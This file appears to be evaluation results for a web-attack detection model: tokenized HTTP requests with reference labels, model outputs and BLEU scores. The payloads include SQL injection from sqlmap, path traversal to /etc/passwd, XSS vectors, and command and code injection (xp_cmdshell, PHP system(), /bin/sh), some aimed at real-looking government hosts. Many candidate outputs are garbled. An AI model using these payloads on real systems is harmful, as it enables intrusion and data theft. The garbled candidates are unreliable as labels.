payload,reference_text,candidate_text,bleu_score
"GET / css / / % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af % c0 % ae % c0 % ae % c0 % af / etc / passwd HTTP / 1. 1Cookie : JSESSIONID = 9bkm1 - 6hnnKvhkHsc9laHFL5P2DL _ VdWqThWk1aT. independenceAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8Accept - Encoding : gzip, deflate, brUser - Agent : User - Agent : Mozilla / 4. 0 ( compatible ; MSIE 7. 0 ; Windows NT 5. 1 ; 360SE ) Host : www. nlcy. go. kr : 8080Connection : Keep - alive",Label : 1 Attack Syntax : etc / passwd Attack Type : Path Traversal,Label : 1 Attack Syntax : % % % % % % % % % % % % % % % % % % % % % % % %,0.1529555933752883
"GET / collections / collectionsDetail. do?.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. / windows / win. ini & wrkMngNo = KO - 07062 HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. /... /.. /. /.. /... /.. /. /.. /... /.. /. /.. /... /.. /. / windows / win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . . . . . / . / . . / . . / . . / . . / . . / . . / . . / . . / / . / / . . . . . . . / / / / . . . . . . . . windows windows windows win,0.05680273568897028
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ; CALL / * * / REGEXP _ SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 7564 ), 0 ), 500000000 ), NULL ) - - sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,","Label : 1 Attack Syntax : CALL / * / * / REGEXP _ SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 7564 ), 0 ), 500000000 ), NULL ) - - Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? = = 1 ; SELECT / * * / REGEXP _ SUBSTRING ( REPEAT ( RIGHT ( CHAR ( ) ) , 0 , 500000000 ) ) ) - - Attack Type : SQL Injection",0.35322917806471166
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" / * * / AND / * * / 2672 = 6093 # sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,","Label : 1 Attack Syntax : "" / * * / AND / * * / 2672 = 6093 # Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 "" / * * / AND / * * / 9624 = = # Attack Type : SQL Injection .",0.3372339928160607
"GET / central / journallist / articlepdf. do? article _ seq = 11111') + AND + 1 = 1 + UNION + ALL + SELECT + 1, NULL,'< script > alert ( \ "" XSS \ "" ) < / script > ', table _ name + FROM + information _ schema. tables + WHERE + 2 > 1 - - / * * / ; + EXEC + xp _ cmdshell ('cat +.. /.. /.. / etc / passwd') # HTTP / 1. 1 \ r \ nHost : www. oak. go. kr \ r \ nUser - Agent : Go - http - client / 1. 1 \ r \ nAccept - Encoding : gzip","Label : 1 Attack Syntax : / central / journallist / articlepdf. do? article _ seq = 11111') + AND + 1 = 1 + UNION + ALL + SELECT + 1, NULL,'< script > alert ( \ "" XSS \ "" ) < / script > ', table _ name + FROM + information _ schema. tables + WHERE + 2 > 1 - - / * * / ; + EXEC + xp _ cmdshell ('cat +.. /.. /.. / etc / passwd') # Attack Type : SQL Injection","Label : 1 Attack Syntax : GET / central / journallist / articlepdf . . . + + + + > + > + + + + + + + 1 < script script > script , , , , < script script script > > script > , name > ) > script > > 2 - table + + + + + information - schema . tables WHERE + + + + + - - / * * / / + EXEC + xp . . . . . . . . . . / . . . etc / / passwd ) Attack Type Attack : Injection",0.18103459059283383
"POST / board /? category = & gdviewer = 1 & goods _ seq = 52 & id = goods _ review & iframe = "" > < scrIpt > alert ( 1 ) ; < / scRipt > & page = & perpage = & popup = & score = & search _ text = ZAP HTTP / 1. 1 Host : www. mall. shop User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ; rv : 92. 0 ) Gecko / 20100101 Firefox / 92. 0 Pragma : no - cache Cache - Control : no - cache Content - Type : application / x - www - form - urlencoded Referer : http : / / www. mall. shop / board /? category & gdviewer = 1 & goods _ seq = 52 & id = goods _ review & iframe = 1 & page & perpage & popup & score & search _ text = ZAP Content - Length : 56 Cookie : shopReferer = ; today _ view = a : 15 : { i : 0 ; i : 38 ; i : 1 ; i : 47 ; i : 2 ; i : 41 ; i : 3 ; i : 56 ; i : 4 ; i : 51 ; i : 5 ; i : 42 ; i : 6 ; i : 79 ; i : 7 ; i : 43 ; i : 8 ; i : 77 ; i : 9 ; i : 75 ; i : 10 ; i : 68 ; i : 11 ; i : 54 ; i : 12 ; i : 70 ; i : 13 ; i : 55 ; i : 14 ; i : 52 ; } ; marketplace = direct modetype = & seq = & cmtseq = & cmtparentseq = & cmtreplyidx = & pw = ZAP","Label : 1 Attack Syntax : "" > < scrIpt > alert ( 1 ) ; < / scRipt > Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : "" > > scrIpt > alert ( < / / < scRipt scRipt > Attack : - - Site Scripting Scripting ( XSS",0.4504038223793917
"HTTP / 1. 1 200 200 Date : Wed, 14 Jun 2023 05 : 49 : 09 GMT Server : Ninja Cross - Origin - Opener - Policy : same - origin Cross - Origin - Embedder - Policy - Report - Only : require - corp Expires : Thu, 01 Jan 1970 00 : 00 : 00 GMT Pragma : no - cache Cache - Control : no - cache, no - store Content - Type : text / html ; charset = UTF - 8 Keep - Alive : timeout = 3, max = 300 Connection : Keep - Alive Transfer - Encoding : chunked 2644 <! DOCTYPE HTML > < html xmlns = "" http : / / www. w3. org / 1999 / xhtml "" xmlns : wicket = "" http : / / wicket. sourceforge. net / "" xmlns : fb = "" http : / / www. facebook. com / 2008 / fbml "" xmlns : wb = "" http : / / open. weibo. com / wb "" > < head > < script type = "" text / javascript "" src = "" / / entercdn. ipsosinteractive. com / wicket / resource / org. apache. wicket. resource. JQueryResourceReference / jquery / jquery - 3. 6. 0 - ver - 1670613789000. js "" > < / script > < script type = "" text / javascript "" src = "" / / entercdn. ipsosinteractive. com / wicket / resource / org. apache. wicket. ajax. AbstractDefaultAjaxBehavior / res / js / wicket - ajax - jquery - ver - 1670613789000. js "" > < / script > < script type = "" text / javascript "" id = "" wicket - ajax - base - url "" > / * <! [ CDATA [ * / Wicket. Ajax. baseUrl = "" landing /? p = ShUtX3n7VtnBvpaQ6CNvJ6wABofaxSBtbptcEITWm8uDraOh3LXl1uyYNRaypb3NvtLJFEIOTzZwaSm2K6MIPQ = = & amp ; routerID = 0 & amp ; id = C327052504 _ 4 - 3 -",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ) / * * / OR / * * / 6418 = ( SELECT / * * / COUNT ( * ) / * * / FROM / * * / SYSMASTER : SYSPAGHDR ) / * * / AND / * * / ( 5130 = 5130 sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 ) / * * / OR / * * / 6418 = ( SELECT / * * / COUNT ( * ) / * * / FROM / * * / SYSMASTER : SYSPAGHDR ) / * * / AND / * * / ( 5130 = 5130 Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 ) / * * / OR / * * / / = * / / / * / / ( * * / * * / / / * * / / / * / / * / / / / * * / / =,0.5340909088264449
"GET / plus / flink. php? c = cat + / etc / passwd & dopost = save HTTP / 1. 1Host : library. kopri. re. krUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36Connection : closeReferer : <? php'system'( $ c ) ; die ; / * refAccept - Encoding : gzip",Label : 1 Attack Syntax : <? php'system'( $ c ) ; die ; / * ref Attack Type : Code Injection,Label : 1 Attack Syntax : GET / / / . . / . / / / / / / / . . . . Attack Type : : Execution : : : :,0.17525531287426316
"GET / stats / search _ auto _ complete? keyword = # jaVasCript : / * - / * ` / * \ ` / *'/ * "" / * * / ( / * + * / oNcliCk = alert ( 5397 ) + ) / / % 0D % 0A % 0d % 0a / / < / stYle / < / titLe / < / teXtarEa / < / scRipt / - -! > \ x3csVg / < sVg / oNloAd = alert ( 5397 ) / / > \ x3e HTTP / 1. 1 Host : www. mall. shop User - Agent : Mozilla / 5. 0 ( X11 ; Linux x86 _ 64 ; rv : 91. 0 ) Gecko / 20100101 Firefox / 91. 0 Accept : application / json, text / javascript, * / * ; q = 0. 01 Accept - Language : en - US, en ; q = 0. 5 X - Requested - With : XMLHttpRequest Connection : keep - alive Referer : http : / / www. mall. shop / goods / brand _ main Cookie : mobileapp = N ; shopReferer = ; marketplace = direct Content - Length : 0","Label : 1 Attack Syntax : # jaVasCript : / * - / * ` / * \ ` / *'/ * "" / * * / ( / * + * / oNcliCk = alert ( 5397 ) + ) / / % 0D % 0A % 0d % 0a / / < / stYle / < / titLe / < / teXtarEa / < / scRipt / - -! > \ x3csVg / < sVg / oNloAd = alert ( 5397 ) / / > \ x3e Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : # jaVasCript : / * - / * ` / * \ ` / * ' / * "" / * * / ( / * + * / oNcliCk = alert ( 5397 ) + ) / / % 0D % 0A % 0d % 0a / / < / stYle / < / titLe / < / teXtarEa / < / scRipt / - - ! > \ x3csVg / < sVg / oNloAd = alert ( 5397 ) / / > \ x3e Attack Type : Cross - Site Scripting ( XSS )",0.9198493971216793
"GET / learn / AjaxLearnList. do? emBigCd = 06 & emSmlCd = & pageIndex = & searchCcdId = & searchSmlCd =.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / proc / version & searchStat = & searchSttCd = & searchText = HTTP / 1. 1 \ nReferer : http : / / www. mmca. go. kr / \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ nAccept - Encoding : gzip, deflate \ nHost : www. mmca. go. kr \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. /.. / proc / version Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . / . . . . . / / / . / Attack Attack : : :,0.07303863538896592
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" ) ) / * * / AND / * * / MAKE _ SET ( 8503 = 3792, 3792 ) / * * / AND / * * / ( ( "" dZTB "" / * * / LIKE / * * / "" dZTB sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" ) ) / * * / AND / * * / MAKE _ SET ( 8503 = 3792, 3792 ) / * * / AND / * * / ( ( "" dZTB "" / * * / LIKE / * * / "" dZTB Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 "" ) ) / * * / AND / * * / MAKE _ SET ( 2937 = 2937 , 2995 ) / * * / AND / * * / ( ( "" "" "" / * * / LIKE / * * / "" Attack Attack Type : SQL Injection",0.7528447260066685
"GET / sparql? output = json & format = json & timeout = 0 & query = SELECT DISTINCT * WHERE {? object? property < http : / / data. visitkorea. or. kr / resource / CATEGORY : 360909 >. FILTER ( isIRI (? object ) ) } LIMIT 100 & callback = lodlive HTTP / 1. 1Host : data. visitkorea. or. krAccept - Language : en - USCookie : JSESSIONID = 7071FD500B092138A0084CC9FE1583CF. routerReferer : http : / / data. visitkorea. or. kr / lodlive? http : / / data. visitkorea. or. kr / resource / CATEGORY : 360909Connection : keep - aliveAccept : * / * From : googlebot ( at ) googlebot. comUser - Agent : Mozilla / 5. 0 ( Linux ; Android 6. 0. 1 ; Nexus 5X Build / MMB29P ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 98. 0. 4758. 102 Mobile Safari / 537. 36 ( compatible ; Googlebot / 2. 1 ; + http : / / www. google. com / bot. html ) Accept - Encoding : gzip, deflate, br",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"this. context + "" / api / auth / updateuseraccessstatus "", e ) } userAuthenticationTokenCheck $ ( e ) { return this. http. post ( this. context + "" / api / auth / selectuseracesstoken "", e ) } checkDuplicatedHp $ ( e ) { return this. http. post ( this. context + "" / api / auth / checkduplicatedhp "", e ) } sendEmailPasswordFind ( e ) { return this. http. post ( this. context + "" / api / v1 / mail / send "", { user _ id : e } ) } sendAwsEmailPasswordFind ( e ) { return this. http. post ( "" https : / / dev - igi. kro. kr / dmz - integrated - system / api / v1 / mail / password / send "", e ) } sendAwsEmailSignInAuth ( e ) { return this. http. post ( "" https : / / dev - igi. kro. kr / dmz - integrated - system / api / v1 / mail / signin / send "", e ) } getFindPwdMailToken ( e ) { return this. http. post ( this. context + "" / api / auth / pwd / token "", e ) } errorSendEmailDeleteUser ( e ) { return this. http. post ( this. context + "" / api / auth / register / rollback "", e ) } handleError ( e ) { return 0 = = = e. status? console. error ( "" An error occurred : "", e. error. message ) : console. error ( ` Backend returned code $ { e. status }, body was : $ { e. error } ` ), $ h ( "" Something bad happened ; please try again later. "" ) } passwordValidation ( e ) { return / ^ (? =. * [ a - zA - Z ] ) (? =. * [! @ # $ % ^ * + = - ] ) (? =. * [ 0 - 9 ] ). { 8, 25 } $ /. test ( e ) } emailValidation ( e ) { return / ^ ( ( [ ^ < > (",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / cop / bbs / view / B0000153 / 1210329. do? statisMenuNo = 200911'AND 5195 = 8633 - - Jtuu HTTP / 1. 1 \ r \ nCache - Control : no - cache \ r \ nUser - Agent : Mozilla / 5. 0 ( X11 ; U ; Linux x86 _ 64 ; en - US ; rv : 1. 9. 0. 8 ) Gecko / 2009040312 Gentoo Firefox / 3. 0. 8 \ r \ nReferer : http : / / kocca. kr : 80 / cop / bbs / view / B0000153 / 1210329. do \ r \ nHost : kocca. kr \ r \ nCookie : KCSESSIONID = v2LBgk3dqhp2GpJTJhz2DlZJCwYSB8Rjm4yjZN8BMxRFnSg55vx1! - 368784361! 385399486 \ r \ nAccept : * / * \ r \ nAccept - Encoding : gzip, deflate \ r \ nConnection : close",Label : 1 Attack Syntax : AND 5953 = 8633 - - Jtuu Attack Type : SQL Injection,Label : 1 Attack Syntax : AND AND = 3145 Attack Type : : SQL Injection,0.47415231822240783
"POST / dev / xmlrpc. php HTTP / 1. 1 Host : www. nifs. go. kr User - Agent : Mozilla / 5. 0 ( Windows NT 1 0. 0 ; Win 6 4 ; x 6 4 ) AppleWebKit / 5 3 7. 3 6 ( KHTML COMMA like Gecko ) Chrome / 8 3. 0. 4 1 0 3. 1 1 6 Safari / 5 3 7. 3 6 Content - Length : 1 9 2 Accept : * / * Content - Type : application / xml ; charset = utf - 8 Connection : close <? xml version = "" 1. 0 "" encoding = "" UTF - 8 ""? > < methodCall > < methodName > wp. getUsersBlogs < / methodName > < params > < param > < value > admin < / value > < / param > < param > < value > admin < / value > < / param > < / params > < / methodCall >",Label : 1 Attack Syntax : POST / dev / xmlrpc. php Attack Type : XML - RPC Injection,Label : 1 Attack Syntax : wp . getUsersBlogs Attack Type : XML - RPC,0.4959727155530249
"POST / cgi - bin /.. /.. /.. /.. /.. /.. / bin / sh HTTP / 1. 1Connection : Keep - AliveHost : lib. mmk. or. krPragma : no - cacheCache - Control : no - cacheUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 97. 0. 4692. 99 Safari / 537. 36Accept : image / gif, image / x - xbitmap, image / jpeg, image / pjpeg, image / png, * / * Accept - Language : enAccept - Charset : iso - 8859 - 1, *, utf - 8Content - Length : 7echo ; id","Label : 1 Attack Syntax : POST / cgi - bin /.. /.. /.. /.. /.. /.. / bin / sh HTTP / 1. 1 Connection : Keep - Alive Host : lib. mmk. or. kr Pragma : no - cache Cache - Control : no - cache User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 97. 0. 4692. 99 Safari / 537. 36 Accept : image / gif, image / x - xbitmap, image / jpeg, image / pjpeg, image / png, * / * Accept - Language : en Accept - Charset : iso - 8859 - 1, *, utf - 8 Content - Length : 7echo ; id Attack Type : Command Injection",Label : 1 Attack Syntax : GET / cgi bin bin / . . . . . . . . / . . / . . / . . / . / / . : / :,0.012093323035845725
"GET / main / board / kboard _ view. asp page = 1 & search _ t = & search _ m = vtitle - - > ; < / script > + ACJ - + AD4APB - SCRIPT / TYPE = TEXT / VBSCRIPT + AD7 - MSGBOX ( 123 ) + AA0APB - / SCRIPT + AD7 - & seq = 7 200 Mozilla / 5. 0 + ( Windows + NT + 6. 1 ; + WOW64 ; + Trident / 7. 0 ; + rv : 11. 0 ) + like + Gecko,",Label : 1 Attack Syntax : MSGBOX ( 123 ) Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : - - > + < / / < script script + + AD4APB + AD7 - - 123 - AA0APB - - : - -,0.16352670859125376
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1'/ * * / AND / * * / ( SELECT / * * / 9111 / * * / FROM ( SELECT / * * / COUNT ( * ), CONCAT % 2 - port - x717a6a6a71, ( SELECT / * * / ( ELT ( 9111 = 9111, 1 ) ) ), 0x716b786271, FLOOR ( RAND % 2 - port - ) * 2 ) ) x / * * / FROM / * * / INFORMATION _ SCHEMA. PLUGINS / * * / GROUP / * * / BY / * * / x ) a ) / * * / OR / * * /'QQRe'='cYQJ sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1'/ * * / AND / * * / ( SELECT / * * / 9111 / * * / FROM ( SELECT / * * / COUNT ( * ), CONCAT % 2 - port - x717a6a6a71, ( SELECT / * * / ( ELT ( 9111 = 9111, 1 ) ) ), 0x716b786271, FLOOR ( RAND % 2 - port - ) * 2 ) ) x / * * / FROM / * * / INFORMATION _ SCHEMA. PLUGINS / * * / GROUP / * * / BY / * * / x ) a ) / * * / OR / * * /'QQRe'='cYQJ Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 ' / * * / AND / * * / ( SELECT / * * / 9111 / * * / FROM ( SELECT / * * / COUNT ( * ) , CONCAT % 2 - port - x717a6a6a71 , ( SELECT / * * / ( ELT ( 9111 = 6149 , 1 ) ) ) , 0x716a626271 , FLOOR ( RAND % 2 - port - ) * 2 ) ) x / * * / FROM / * * / INFORMATION _ SCHEMA . PLUGINS / * * / GROUP / * * / BY / * * / x ) a ) / * * / OR / * * / ' ' ' = ' sqlmap sqlmap / 1 . 5 . 1 . 40 # dev ( http : / / sqlmap . org Type : SQL",0.6537946411321824
"> < / li > < / ul > < / li > < / ul > < a href = "" / culture / publicize. do "" class = "" banner _ link "" > < img src = "" / assets / images / common _ new / img _ culture _ guide. png "" alt = "" "" / > < / a > < a href = "" http : / / culture - chatbot. kcisa. kr "" class = "" btn _ chatbot "" onclick = "" openPopup ( this. href, 500, 650 ) ; return false ; "" > < img src = "" / assets / images / common _ new / btn _ chatbot. png "" alt = "" "" / > < / a > <! - - < a href = "" http : / / kcisa. kro. kr / iChat "" target = "" _ blank "" class = "" btn _ chatbot "" onclick = "" openPopup ( this. href, 500, 650 ) ; return false ; "" > < img src = "" / assets / images / common _ new / btn _ chatbot. png "" alt = "" "" > < / a > - - > < / nav > < / div > < div class = "" header _ tab "" style = "" display : none ; "" > < nav class = "" nav "" > < ul > < li > < a href = "" / home / index. do "" > < / a > < / li > < li > < a href = "" / culturetv / mainList. do "" > < / a > < / li > < li > < a href = "" / archive / archiveMain. do "" > < / a > < /",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / board / board _ view / < marquee + onstart = alert ( 45 ) >? http : / / 10. 0. 20. 20 / board / board _ view / < marquee + onstart = alert ( 45 ) >? code = welfare & no = HTTP / 1. 1 Accept - Encoding : gzip ; q = 1. 0, deflate ; q = 0. 6, identity ; q = 0. 3 Accept : * / * User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; WOW64 ; rv : 56. 0 ) Gecko / 20100101 Firefox / 56. 0 Connection : keep - alive Host : 10. 0. 20. 20",Label : 1 Attack Syntax : < marquee onstart = alert ( 45 ) > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < svg onstart alert alert alert ) > Attack Type : : - Site Scripting Scripting XSS ) ),0.4578226095312774
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 8662 %'/ * * / OR / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9912 = 9912 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CAST ( ( CHR ( 74 ) | | CHR ( 78 ) | | CHR ( 117 ) | | CHR ( 83 ) ) / * * / AS / * * / NUMERIC ) / * * / END ) ) / * * / IS / * * / NULL / * * / AND / * * /'XVSw %'='XVSw sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 8662 %'/ * * / OR / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9912 = 9912 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CAST ( ( CHR ( 74 ) | | CHR ( 78 ) | | CHR ( 117 ) | | CHR ( 83 ) ) / * * / AS / * * / NUMERIC ) / * * / END ) ) / * * / IS / * * / NULL / * * / AND / * * /'XVSw %'='XVSw Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = - ' % ' / * * / OR / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9912 = 9912 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CAST ( ( CHR ( 74 ) | | CHR ( | ) | | CHR ) 117 ) | | CHR ( | ) ) / * * / AS / * * / NUMERIC ) / * * / END ) ) / * * / IS / * * / NULL / * * / AND / * * / / ' ' ' ' ' Attack Attack Type : SQL Injection,0.8005627761950542
